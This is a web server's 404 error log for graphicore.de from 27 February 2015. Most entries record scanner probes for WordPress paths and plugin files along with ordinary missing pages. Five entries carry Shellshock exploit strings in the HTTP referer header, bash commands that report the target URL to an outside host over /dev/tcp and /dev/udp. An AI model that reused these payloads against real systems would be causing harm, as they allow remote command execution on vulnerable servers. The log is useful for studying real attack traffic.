2015-02-27T02:21:56+00:00 ERR (3) 404 Page not found
REMOTE_ADDR: 54.93.119.91
HTTP_REFERER: 
requested: array(4) {
  ["controller"] => string(10) "wp-content"
  ["action"] => string(7) "plugins"
  ["fancybox-for-wordpress"] => string(10) "readme.txt"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2015-02-27T02:21:57+00:00 ERR (3) 404 Page not found
REMOTE_ADDR: 54.93.119.91
HTTP_REFERER: 
requested: array(4) {
  ["controller"] => string(4) "blog"
  ["action"] => string(10) "wp-content"
  ["plugins"] => string(22) "fancybox-for-wordpress"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2015-02-27T02:21:57+00:00 ERR (3) 404 Page not found
REMOTE_ADDR: 54.93.119.91
HTTP_REFERER: 
requested: array(4) {
  ["controller"] => string(9) "wordpress"
  ["action"] => string(10) "wp-content"
  ["plugins"] => string(22) "fancybox-for-wordpress"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2015-02-27T03:41:55+00:00 ERR (3) 404 Page not found
REMOTE_ADDR: 80.82.16.118
HTTP_REFERER: http://www.graphicore.de/
requested: array(3) {
  ["controller"] => string(5) "forum"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2015-02-27T05:13:26+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 5.9.37.121
HTTP_REFERER: http://graphicore.de/forum/
requested: array(3) {
  ["controller"] => string(5) "forum"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2015-02-27T10:42:31+00:00 ERR (3) 404 Page not found
REMOTE_ADDR: 87.206.240.230
HTTP_REFERER: http://www.graphicore.de/
requested: array(3) {
  ["controller"] => string(5) "forum"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2015-02-27T11:39:39+00:00 ERR (3) 404 Page not found
REMOTE_ADDR: 198.101.158.132
HTTP_REFERER: () { :;}; /bin/bash -c "echo graphicore.de/cgi-bin/php5-cli? > /dev/tcp/213.233.161.42/23; echo graphicore.de/cgi-bin/php5-cli? > /dev/udp/213.233.161.42/80"
requested: array(3) {
  ["controller"] => string(7) "cgi-bin"
  ["action"] => string(8) "php5-cli"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2015-02-27T11:39:39+00:00 ERR (3) 404 Page not found
REMOTE_ADDR: 198.101.158.132
HTTP_REFERER: () { :;}; /bin/bash -c "echo graphicore.de/phppath/php? > /dev/tcp/213.233.161.42/23; echo graphicore.de/phppath/php? > /dev/udp/213.233.161.42/80"
requested: array(3) {
  ["controller"] => string(7) "phppath"
  ["action"] => string(3) "php"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2015-02-27T11:39:40+00:00 ERR (3) 404 Page not found
REMOTE_ADDR: 198.101.158.132
HTTP_REFERER: () { :;}; /bin/bash -c "echo graphicore.de/cgi-bin/php5? > /dev/tcp/213.233.161.42/23; echo graphicore.de/cgi-bin/php5? > /dev/udp/213.233.161.42/80"
requested: array(3) {
  ["controller"] => string(7) "cgi-bin"
  ["action"] => string(4) "php5"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2015-02-27T11:39:42+00:00 ERR (3) 404 Page not found
REMOTE_ADDR: 198.101.158.132
HTTP_REFERER: () { :;}; /bin/bash -c "echo graphicore.de/cgi-bin/php? > /dev/tcp/213.233.161.42/23; echo graphicore.de/cgi-bin/php? > /dev/udp/213.233.161.42/80"
requested: array(3) {
  ["controller"] => string(7) "cgi-bin"
  ["action"] => string(3) "php"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2015-02-27T11:39:42+00:00 ERR (3) 404 Page not found
REMOTE_ADDR: 198.101.158.132
HTTP_REFERER: () { :;}; /bin/bash -c "echo graphicore.de/phppath/cgi_wrapper? > /dev/tcp/213.233.161.42/23; echo graphicore.de/phppath/cgi_wrapper? > /dev/udp/213.233.161.42/80"
requested: array(3) {
  ["controller"] => string(7) "phppath"
  ["action"] => string(11) "cgi_wrapper"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2015-02-27T13:09:42+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 195.154.183.187
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(8) "wp-admin"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2015-02-27T13:55:53+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 76.73.74.82
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(3) "old"
  ["action"] => string(8) "wp-admin"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2015-02-27T14:42:34+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 91.61.103.232
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(32) "apple-touch-icon-precomposed.png"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2015-02-27T14:42:35+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 91.61.103.232
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(20) "apple-touch-icon.png"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2015-02-27T16:18:24+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 66.249.65.195
HTTP_REFERER: 
requested: array(4) {
  ["controller"] => string(5) "diary"
  ["action"] => string(29) "tag:graphicore.de,2010-10-12:"
  ["diary"] => string(27) "201010121448344cb475424313c"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2015-02-27T19:48:22+00:00 ERR (3) 404 "topic" was not found.
REMOTE_ADDR: 93.178.93.198
HTTP_REFERER: http://graphicore.de/en/index/topic/intern/projekte/
requested: array(6) {
  ["lang"] => string(2) "en"
  ["action"] => string(5) "index"
  ["key"] => string(5) "topic"
  ["intern"] => string(8) "projekte"
  ["module"] => string(7) "default"
  ["controller"] => string(5) "index"
}


--------------------------------------------------------------------------------
2015-02-27T21:24:46+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 192.187.99.195
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(12) "wp-login.php"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
